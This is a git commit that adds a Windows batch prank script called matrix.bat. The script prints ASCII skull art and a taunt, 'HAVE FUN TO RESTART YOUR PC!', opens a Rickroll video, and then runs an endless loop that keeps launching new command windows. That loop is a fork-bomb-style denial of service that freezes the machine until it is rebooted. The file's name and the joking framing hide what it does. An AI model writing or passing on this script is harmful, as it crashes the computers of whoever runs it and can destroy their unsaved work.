a8ace686824269fbb618a1ef2f30566e3c7ce9e0
Neikinikless <67499407+Neikinikless@users.noreply.github.com>
2021-03-16 07:55:28 +0100

    DONT COPY (BETA FILES)
    DONT COPY THIS FILES (BETA!!!)

---
+++ matrix.bat
@@ -0,0 +1,38 @@
+@echo off
+color 0a
+cls
+mode 1000
+
+
+echo HAVE FUN TO RESTART YOUR PC!
+echo.
+echo       NO!                          MNO!
+echo     MNO!!         [NBK]          MNNOO!
+echo   MMNO!                           MNNOO!!
+echo MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!!
+echo !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO!
+echo       ! MMMMMMMMMMMMMPPPPOOOOIII! !
+echo        MMMMMMMMMMMMPPPPPOOOOOOII!!
+echo        MMMMMOOOOOOPPPPPPPPOOOOMII!
+echo        MMMMM..    OPPMMP    .,OMI!
+echo        MMMM::   o.,OPMP,.o   ::I!!
+echo          NNM:::.,,OOPM!P,.::::!!
+echo         MMNNNNNOOOOPMO!!IIPPO!!O!
+echo         MMMMMNNNNOO:!!:!!IPPPPOO!
+echo          MMMMMNNOOMMNNIIIPPPOO!!
+echo             MMMONNMMNNNIIIOO!
+echo           MN MOMMMNNNIIIIIO! OO
+echo          MNO! IiiiiiiiiiiiI OOOO
+echo     NNN.MNO!   O!!!!!!!!!O   OONO NO!
+echo    MNNNNNO!    OOOOOOOOOOO    MMNNON!
+echo      MNNNNO!    PPPPPPPPP    MMNON!
+echo         OO!                   ON!
+echo.
+echo HAVE FUN TO RESTART YOUR PC!
+
+start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+
+
+:crash
+start
+goto crash 
